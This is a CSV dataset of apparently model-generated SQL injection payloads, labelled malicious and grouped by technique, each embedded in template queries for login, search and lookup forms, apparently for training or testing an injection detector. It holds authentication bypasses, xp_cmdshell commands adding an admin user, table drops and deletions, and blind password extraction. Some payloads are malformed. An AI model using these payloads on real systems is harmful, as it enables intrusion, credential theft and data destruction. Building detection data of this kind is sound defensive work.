attack_category,template_context,payload,full_query,label,source,generator_model,round
stacked_queries,login,"OR '1'='1"";","SELECT * FROM users WHERE username = 'OR '1'='1"";' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,login,"); INSERT INTO sessions (username, token) VALUES ('admin', 'hacked'); --","SELECT * FROM users WHERE username = '); INSERT INTO sessions (username, token) VALUES ('admin', 'hacked'); --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,login,;--',SELECT * FROM users WHERE username = ';--'' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,login,1 OR 'a'='a',SELECT * FROM users WHERE username = '1 OR 'a'='a'' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,login,OR 'a'='a,SELECT * FROM users WHERE username = 'OR 'a'='a' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,login,' AND  ( SELECT NULL FROM dual ) --,SELECT * FROM users WHERE username = '' AND  ( SELECT NULL FROM dual ) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,search,; WAITFOR DELAY '0:0:5' AND (SELECT 1=1),SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5' AND (SELECT 1=1)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,search,; EXEC xp_cmdshell 'whoami',SELECT * FROM products WHERE name LIKE '%; EXEC xp_cmdshell 'whoami'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,search,' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin') --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin') --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,search,'/* DROP TABLE products */',SELECT * FROM products WHERE name LIKE '%'/* DROP TABLE products */'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,search,'-- DROP TABLE products',SELECT * FROM products WHERE name LIKE '%'-- DROP TABLE products'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,1')); WAITFOR DELAY '0:0:10'; --,SELECT * FROM users WHERE id = 1')); WAITFOR DELAY '0:0:10'; --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,user_lookup,1'); EXECUTE master..xp_cmdshell 'net user hacker P@ssw0rd /add'; --,SELECT * FROM users WHERE id = 1'); EXECUTE master..xp_cmdshell 'net user hacker P@ssw0rd /add'; --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,user_lookup,1;/**/ALTER USER admin IDENTIFIED BY 'newPassword',SELECT * FROM users WHERE id = 1;/**/ALTER USER admin IDENTIFIED BY 'newPassword',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,user_lookup,"[""1')) -- ; DROP TABLE users;""","SELECT * FROM users WHERE id = [""1')) -- ; DROP TABLE users;""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,"1'); DELETE FROM users LIMIT 1;""","SELECT * FROM users WHERE id = 1'); DELETE FROM users LIMIT 1;""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,"1)/* Comment */; INSERT INTO users (username, password) VALUES ('admin', 'password');""","SELECT * FROM users WHERE id = 1)/* Comment */; INSERT INTO users (username, password) VALUES ('admin', 'password');""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,"1); UPDATE users SET password = 'hacked' WHERE id = 1;""","SELECT * FROM users WHERE id = 1); UPDATE users SET password = 'hacked' WHERE id = 1;""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,"1'))/* Another Comment */; TRUNCATE TABLE users;"",]","SELECT * FROM users WHERE id = 1'))/* Another Comment */; TRUNCATE TABLE users;"",]",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,order_filter,); INSERT INTO logs VALUES('attack'); --,SELECT * FROM orders WHERE status = '); INSERT INTO logs VALUES('attack'); --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,order_filter,";--\""\""=\""\"" UNION ALL SELECT NULL,NULL,'dropped_table',NULL#""","SELECT * FROM orders WHERE status = ';--\""\""=\""\"" UNION ALL SELECT NULL,NULL,'dropped_table',NULL#""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,order_filter,";/**/ALTER TABLE users SET password='hacked'/**/""","SELECT * FROM orders WHERE status = ';/**/ALTER TABLE users SET password='hacked'/**/""' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,order_filter,OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--,SELECT * FROM orders WHERE status = 'OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,order_filter,"; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_addextendedproperty @name=N'MS_Description', @value=N'This is a comment to mask the SQL command', @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'orders'; --","SELECT * FROM orders WHERE status = '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_addextendedproperty @name=N'MS_Description', @value=N'This is a comment to mask the SQL command', @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'orders'; --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,order_filter,; WAITFOR DELAY '0:0:10'; UPDATE orders SET status = 'processed' WHERE user_id < 100 --,SELECT * FROM orders WHERE status = '; WAITFOR DELAY '0:0:10'; UPDATE orders SET status = 'processed' WHERE user_id < 100 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,order_filter,; DECLARE @cmd NVARCHAR(500); SET @cmd = N'DELETE FROM orders WHERE 1=1'; EXECUTE(@cmd) --,SELECT * FROM orders WHERE status = '; DECLARE @cmd NVARCHAR(500); SET @cmd = N'DELETE FROM orders WHERE 1=1'; EXECUTE(@cmd) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,comment_insert,"' UNION ALL SELECT 1, 1, 1, 1 #","INSERT INTO comments (user_id, body) VALUES (1, '' UNION ALL SELECT 1, 1, 1, 1 #')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,comment_insert,; SELECT * FROM users WHERE '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '; SELECT * FROM users WHERE '1'='1')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,comment_insert,' AND 1=1/*; DELETE FROM sessions;,"INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1/*; DELETE FROM sessions;')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,comment_insert,--''; EXEC sp_droplogin 'sa'; --,"INSERT INTO comments (user_id, body) VALUES (1, '--''; EXEC sp_droplogin 'sa'; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,comment_insert,"--""; WAITFOR DELAY '0:0:5' AND (SELECT '%' = '%')","INSERT INTO comments (user_id, body) VALUES (1, '--""; WAITFOR DELAY '0:0:5' AND (SELECT '%' = '%')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,login,--1' OR 1=1#,SELECT * FROM users WHERE username = '--1' OR 1=1#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,login,1'/**/OR/**/?=1--,SELECT * FROM users WHERE username = '1'/**/OR/**/?=1--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,login,1'/*1=1,SELECT * FROM users WHERE username = '1'/*1=1' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,login,/**/SELECT/**/NULL/**/FROM/**/users/**/WHERE/**/username/**/=/**/'--'/**/AND/**/password/**/=/**/'anything',SELECT * FROM users WHERE username = '/**/SELECT/**/NULL/**/FROM/**/users/**/WHERE/**/username/**/=/**/'--'/**/AND/**/password/**/=/**/'anything'' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,1'/**/OR/**/CASE/**/WHEN/**/3%3D3/**/THEN/**/1/**/ELSE/**/0/**/END/**/=/**/1/**/#,SELECT * FROM users WHERE username = '1'/**/OR/**/CASE/**/WHEN/**/3%3D3/**/THEN/**/1/**/ELSE/**/0/**/END/**/=/**/1/**/#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,"--1'/**/UNION/**/ALL/**/SELECT/**/NULL/**/,/**/NULL/**/,/**/NULL/**/#","SELECT * FROM users WHERE username = '--1'/**/UNION/**/ALL/**/SELECT/**/NULL/**/,/**/NULL/**/,/**/NULL/**/#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,1'/**/LIKE/**/'-1'/**/-/**/%'/**//**/AND/**/password/**/=/**/'anything'/**/--,SELECT * FROM users WHERE username = '1'/**/LIKE/**/'-1'/**/-/**/%'/**//**/AND/**/password/**/=/**/'anything'/**/--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,"-1'/**/UNION/**/SELECT/**/1,/**/2,/**/SUBSTR(CAST(SLEEP(5)/**/AS/**/VARCHAR),/**/1,/**/1)/**/LIMIT/**/1/**/#","SELECT * FROM users WHERE username = '-1'/**/UNION/**/SELECT/**/1,/**/2,/**/SUBSTR(CAST(SLEEP(5)/**/AS/**/VARCHAR),/**/1,/**/1)/**/LIMIT/**/1/**/#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,login,'/*'*/ OR 1=1#,SELECT * FROM users WHERE username = ''/*'*/ OR 1=1#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,login,--'/**/ OR CHAR(65)-32 IN ('A')#,SELECT * FROM users WHERE username = '--'/**/ OR CHAR(65)-32 IN ('A')#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,login,' AND /* */(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)#,SELECT * FROM users WHERE username = '' AND /* */(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)#' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,search,1'/*'*/and/**/(select/**/count(*)/**/from/**/information_schema.tables),SELECT * FROM products WHERE name LIKE '%1'/*'*/and/**/(select/**/count(*)/**/from/**/information_schema.tables)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,1'#',SELECT * FROM products WHERE name LIKE '%1'#'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,;/**/insert/**/into/**/products(name)/**/values('Exploit')--,SELECT * FROM products WHERE name LIKE '%;/**/insert/**/into/**/products(name)/**/values('Exploit')--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,"'1'/**/or/**/ASCII(SUBSTRING(username,1,1))<110--","SELECT * FROM products WHERE name LIKE '%'1'/**/or/**/ASCII(SUBSTRING(username,1,1))<110--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,search,1'/*!*/ OR 1= (SELECT /*! COUNT(*/ * /*!) FROM INFORMATION_SCHEMA.TABLES),SELECT * FROM products WHERE name LIKE '%1'/*!*/ OR 1= (SELECT /*! COUNT(*/ * /*!) FROM INFORMATION_SCHEMA.TABLES)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,1'--# OR 1= (/**/SELECT/**/CONCAT(CAST(LENGTH((SELECT /**/ user())) AS CHAR)))#,SELECT * FROM products WHERE name LIKE '%1'--# OR 1= (/**/SELECT/**/CONCAT(CAST(LENGTH((SELECT /**/ user())) AS CHAR)))#%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,1'%20OR%201= (%00SELECT%00%20CASE%20WHEN%20(SELECT%20%20%201%20FROM%20dual)%20THEN%20%27a%27%20ELSE%20%27b%27%20END),SELECT * FROM products WHERE name LIKE '%1'%20OR%201= (%00SELECT%00%20CASE%20WHEN%20(SELECT%20%20%201%20FROM%20dual)%20THEN%20%27a%27%20ELSE%20%27b%27%20END)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,"1'/**/%0A UNION ALL SELECT NULL--, NULL --","SELECT * FROM products WHERE name LIKE '%1'/**/%0A UNION ALL SELECT NULL--, NULL --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,"1' OR 1= (SELECT UPPER(CONCAT(CHAR(67),CHAR(67),CHAR(69))))--","SELECT * FROM products WHERE name LIKE '%1' OR 1= (SELECT UPPER(CONCAT(CHAR(67),CHAR(67),CHAR(69))))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,search,/**/1'/**/ AND/**/ (SELECT/**/ COUNT(*)/**/ FROM/**/ users)/**/ --,SELECT * FROM products WHERE name LIKE '%/**/1'/**/ AND/**/ (SELECT/**/ COUNT(*)/**/ FROM/**/ users)/**/ --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,search,"--1'/**/ OR/**/ ASCII(SUBSTRING(password,1,1)) < 115","SELECT * FROM products WHERE name LIKE '%--1'/**/ OR/**/ ASCII(SUBSTRING(password,1,1)) < 115%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,search,#1'/**/ WAITFOR DELAY '0:0:10'/**/ AND/**/ '%' = '%',SELECT * FROM products WHERE name LIKE '%#1'/**/ WAITFOR DELAY '0:0:10'/**/ AND/**/ '%' = '%'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,user_lookup,"#/**/1' UNION SELECT username, password FROM admins#","SELECT * FROM users WHERE id = #/**/1' UNION SELECT username, password FROM admins#",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '#%'--,SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '#%'--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,"-3999""') OR '1'='1'--+","SELECT * FROM users WHERE id = -3999""') OR '1'='1'--+",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,' OR 'x'='x'/*'a'='a,SELECT * FROM users WHERE id = ' OR 'x'='x'/*'a'='a,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,user_lookup,/**/1' /*comment*/ OR EXISTS(SELECT * FROM users /*comment*/ WHERE id = 'admin' AND password LIKE '#%%',SELECT * FROM users WHERE id = /**/1' /*comment*/ OR EXISTS(SELECT * FROM users /*comment*/ WHERE id = 'admin' AND password LIKE '#%%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,"--1' UNION ALL SELECT username, password FROM users --","SELECT * FROM users WHERE id = --1' UNION ALL SELECT username, password FROM users --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,"#1' OR CAST(CHAR(48, 49, 50, 48, 49, 48, 48, 48, 48, 48, 48, 48, 48, 48) AS INT) > 0 --","SELECT * FROM users WHERE id = #1' OR CAST(CHAR(48, 49, 50, 48, 49, 48, 48, 48, 48, 48, 48, 48, 48, 48) AS INT) > 0 --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,-1' OR (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables WHERE table_type = 'BASE TABLE')) = 1--,SELECT * FROM users WHERE id = -1' OR (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables WHERE table_type = 'BASE TABLE')) = 1--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,//1' OR 1=1/#,SELECT * FROM users WHERE id = //1' OR 1=1/#,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,user_lookup,"/**/1' UNION SELECT username, password FROM users/**/","SELECT * FROM users WHERE id = /**/1' UNION SELECT username, password FROM users/**/",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,user_lookup,--1' OR (SELECT MAX(id) FROM users) > 1--,SELECT * FROM users WHERE id = --1' OR (SELECT MAX(id) FROM users) > 1--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,user_lookup,#1' OR (SELECT 1 FROM system_tables) = 1#,SELECT * FROM users WHERE id = #1' OR (SELECT 1 FROM system_tables) = 1#,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,order_filter,/**/ OR /**/'1'='1,SELECT * FROM orders WHERE status = '/**/ OR /**/'1'='1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,order_filter,1'; /* --,SELECT * FROM orders WHERE status = '1'; /* --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,order_filter,-- OR '1'='1,SELECT * FROM orders WHERE status = '-- OR '1'='1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,order_filter,# OR 'a'='a'/*,SELECT * FROM orders WHERE status = '# OR 'a'='a'/*' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,order_filter,/* OR */'b'='b',SELECT * FROM orders WHERE status = '/* OR */'b'='b'' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,comment_insert,--%23 AND (SELECT 1 FROM users WHERE username = 'admin') --,"INSERT INTO comments (user_id, body) VALUES (1, '--%23 AND (SELECT 1 FROM users WHERE username = 'admin') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,comment_insert,/*-- AND 'x'='x',"INSERT INTO comments (user_id, body) VALUES (1, '/*-- AND 'x'='x'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
comment_obfuscation,comment_insert,"[""/**/ 3580  =  (select count(*) from domain.domains as t1, domain.columns as t2, domain.tables as t3)"", ""-- ' OR 1=1 --"", ""# ; DROP TABLE IF EXISTS comments;#"", ""/*"") */ SELECT 1 FROM users WHERE username = 'admin'"", ""1%' OR 1=1 AND '%' = '""]","INSERT INTO comments (user_id, body) VALUES (1, '[""/**/ 3580  =  (select count(*) from domain.domains as t1, domain.columns as t2, domain.tables as t3)"", ""-- ' OR 1=1 --"", ""# ; DROP TABLE IF EXISTS comments;#"", ""/*"") */ SELECT 1 FROM users WHERE username = 'admin'"", ""1%' OR 1=1 AND '%' = '""]')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
comment_obfuscation,comment_insert,/*# AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name = 'users'),"INSERT INTO comments (user_id, body) VALUES (1, '/*# AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name = 'users')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,comment_insert,#; WAITFOR DELAY '0:0:5' AND (1=1)),"INSERT INTO comments (user_id, body) VALUES (1, '#; WAITFOR DELAY '0:0:5' AND (1=1))')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
comment_obfuscation,comment_insert,--%23 AND (SELECT 1 FROM users WHERE username LIKE '%admin'),"INSERT INTO comments (user_id, body) VALUES (1, '--%23 AND (SELECT 1 FROM users WHERE username LIKE '%admin')')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,"1' AND (SELECT IF(SUBSTRING((SELECT USER()),1,1)='root',1,0))#","SELECT * FROM users WHERE username = '1' AND (SELECT IF(SUBSTRING((SELECT USER()),1,1)='root',1,0))#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,login,1' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.USERS WHERE PASSWORD=''),SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.USERS WHERE PASSWORD='')' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,login,%27+UNION+SELECT+NULL+FROM+(SELECT+CASE+WHEN+%28SELECT+SLEEP%285%29%29%3D%28SELECT+SLEEP%285%29%29+THEN+1+ELSE+0+END+AS+x+FROM+dual)%2B'%27--+,SELECT * FROM users WHERE username = '%27+UNION+SELECT+NULL+FROM+(SELECT+CASE+WHEN+%28SELECT+SLEEP%285%29%29%3D%28SELECT+SLEEP%285%29%29+THEN+1+ELSE+0+END+AS+x+FROM+dual)%2B'%27--+' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,login,"%27 UNION ALL SELECT NULL, NULL, NULL FROM (SELECT 1 FROM users WHERE username LIKE '%'""","SELECT * FROM users WHERE username = '%27 UNION ALL SELECT NULL, NULL, NULL FROM (SELECT 1 FROM users WHERE username LIKE '%'""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,"OR '1'='1' --""","SELECT * FROM users WHERE username = 'OR '1'='1' --""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,CHAR(39) || ' OR ' || CHAR(39) || '1' || CHAR(39) || '=' || CHAR(39) || '1' || CHAR(39),SELECT * FROM users WHERE username = 'CHAR(39) || ' OR ' || CHAR(39) || '1' || CHAR(39) || '=' || CHAR(39) || '1' || CHAR(39)' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,"CHAR(34) || CHAR(37) || CHAR(42) || CHAR(34) || "" OR 'x'='x""","SELECT * FROM users WHERE username = 'CHAR(34) || CHAR(37) || CHAR(42) || CHAR(34) || "" OR 'x'='x""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,login,OR (SELECT 1 FROM users WHERE username = 'admin') #,SELECT * FROM users WHERE username = 'OR (SELECT 1 FROM users WHERE username = 'admin') #' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,search,%' OR 'a'='a',SELECT * FROM products WHERE name LIKE '%%' OR 'a'='a'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,search,"%' UNION ALL SELECT NULL, NULL, NULL, NULL#","SELECT * FROM products WHERE name LIKE '%%' UNION ALL SELECT NULL, NULL, NULL, NULL#%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,search,%'xp_cmdshell('dir')--,SELECT * FROM products WHERE name LIKE '%%'xp_cmdshell('dir')--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,search,"[""%\' ANDCHAR(65) = CHAR(65)--""","SELECT * FROM products WHERE name LIKE '%[""%\' ANDCHAR(65) = CHAR(65)--""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'UNION ALLSELECTCHAR(73),CHAR(83),CHAR(75),NULL#""","SELECT * FROM products WHERE name LIKE '%%\'UNION ALLSELECTCHAR(73),CHAR(83),CHAR(75),NULL#""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'--%\'OR \'1\'=\'1\""""","SELECT * FROM products WHERE name LIKE '%%\'--%\'OR \'1\'=\'1\""""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'WAITFOR DELAY \'0:0:10\'AND \'a\'=\'a\""""","SELECT * FROM products WHERE name LIKE '%%\'WAITFOR DELAY \'0:0:10\'AND \'a\'=\'a\""""%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,"%\'/*%\'+CHAR(80)+CHAR(72)%\'+*/--""]","SELECT * FROM products WHERE name LIKE '%%\'/*%\'+CHAR(80)+CHAR(72)%\'+*/--""]%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,search,% OR (CAST(HEX(ASCII((SELECT USER()))) AS CHAR) = '68656c6c6f20776f726c64'),SELECT * FROM products WHERE name LIKE '%% OR (CAST(HEX(ASCII((SELECT USER()))) AS CHAR) = '68656c6c6f20776f726c64')%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,search,"% AND (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'h') THEN 1 ELSE 0 END) --","SELECT * FROM products WHERE name LIKE '%% AND (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'h') THEN 1 ELSE 0 END) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,user_lookup,%22-1%22; WAITFOR DELAY+'0:0:5'+--,SELECT * FROM users WHERE id = %22-1%22; WAITFOR DELAY+'0:0:5'+--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
encoding_obfuscation,user_lookup,-9223372036854775807%22+WAITFOR+DELAY+'0:0:5'+--,SELECT * FROM users WHERE id = -9223372036854775807%22+WAITFOR+DELAY+'0:0:5'+--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,user_lookup,' AND 1=1 OR CAST('a' AS CHAR(1))='b',SELECT * FROM users WHERE id = ' AND 1=1 OR CAST('a' AS CHAR(1))='b',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,user_lookup,"%22UNION+SELECT+'admin',NULL,NULL,NULL--","SELECT * FROM users WHERE id = %22UNION+SELECT+'admin',NULL,NULL,NULL--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
encoding_obfuscation,user_lookup,/*comment*/1'/**/or/**/CAST('0'/**/AS/**/CHAR(1))='1--,SELECT * FROM users WHERE id = /*comment*/1'/**/or/**/CAST('0'/**/AS/**/CHAR(1))='1--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
